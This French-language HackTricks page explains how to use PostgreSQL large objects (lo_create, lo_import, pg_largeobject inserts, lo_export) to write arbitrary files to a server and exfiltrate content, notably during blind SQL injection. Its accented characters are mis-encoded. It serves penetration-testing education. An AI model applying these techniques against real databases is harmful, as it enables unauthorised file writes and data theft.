{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Objets volumineux PostgreSQL

PostgreSQL offre une structure connue sous le nom de **grands objets**, accessible via la table `pg_largeobject`, con√ßue pour stocker de grands types de donn√©es, tels que des images ou des documents PDF. Cette approche est avantageuse par rapport √† la fonction `COPY TO` car elle permet l'**exportation de donn√©es vers le syst√®me de fichiers**, garantissant qu'une r√©plique exacte du fichier original est maintenue.

Pour **stocker un fichier complet** dans cette table, un objet doit √™tre cr√©√© dans la table `pg_largeobject` (identifi√© par un LOID), suivi de l'insertion de morceaux de donn√©es, chacun de 2 Ko, dans cet objet. Il est crucial que ces morceaux soient exactement de 2 Ko (√† l'exception possible du dernier morceau) pour garantir que la fonction d'exportation fonctionne correctement.

Pour **diviser vos donn√©es binaires** en morceaux de 2 Ko, les commandes suivantes peuvent √™tre ex√©cut√©es :
```bash
split -b 2048 your_file # Creates 2KB sized files
```
Pour encoder chaque fichier en Base64 ou Hex, les commandes ci-dessous peuvent √™tre utilis√©es :
```bash
base64 -w 0 <Chunk_file> # Encodes in Base64 in one line
xxd -ps -c 99999999999 <Chunk_file> # Encodes in Hex in one line
```
**Important**: Lors de l'automatisation de ce processus, assurez-vous d'envoyer des morceaux de 2 Ko de bytes en texte clair. Les fichiers encod√©s en hex n√©cessiteront 4 Ko de donn√©es par morceau en raison du doublement de taille, tandis que les fichiers encod√©s en Base64 suivent la formule `ceil(n / 3) * 4`.

Le contenu des objets volumineux peut √™tre consult√© √† des fins de d√©bogage en utilisant :
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
#### Utilisation de `lo_creat` & Base64

Pour stocker des donn√©es binaires, un LOID est d'abord cr√©√© :
```sql
SELECT lo_creat(-1);       -- Creates a new, empty large object
SELECT lo_create(173454);  -- Attempts to create a large object with a specific OID
```
Dans des situations n√©cessitant un contr√¥le pr√©cis, comme l'exploitation d'une injection SQL aveugle, `lo_create` est pr√©f√©r√© pour sp√©cifier un LOID fixe.

Les morceaux de donn√©es peuvent ensuite √™tre ins√©r√©s comme suit :
```sql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 1, decode('<B64 chunk2>', 'base64'));

```
Pour exporter et potentiellement supprimer l'objet volumineux apr√®s utilisation :
```sql
SELECT lo_export(173454, '/tmp/your_file');
SELECT lo_unlink(173454);  -- Deletes the specified large object
```
#### Utilisation de `lo_import` & Hex

La fonction `lo_import` peut √™tre utilis√©e pour cr√©er et sp√©cifier un LOID pour un objet volumineux :
```sql
select lo_import('/path/to/file');
select lo_import('/path/to/file', 173454);
```
Apr√®s la cr√©ation de l'objet, les donn√©es sont ins√©r√©es par page, garantissant que chaque morceau ne d√©passe pas 2 Ko :
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
```
Pour compl√©ter le processus, les donn√©es sont export√©es et l'objet volumineux est supprim√© :
```sql
select lo_export(173454, '/path/to/your_file');
select lo_unlink(173454);  -- Deletes the specified large object
```
### Limitations

Il est not√© que **les objets volumineux peuvent avoir des ACL** (Listes de Contr√¥le d'Acc√®s), restreignant potentiellement l'acc√®s m√™me aux objets cr√©√©s par votre utilisateur. Cependant, les objets plus anciens avec des ACL permissives peuvent encore √™tre accessibles pour l'exfiltration de contenu.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
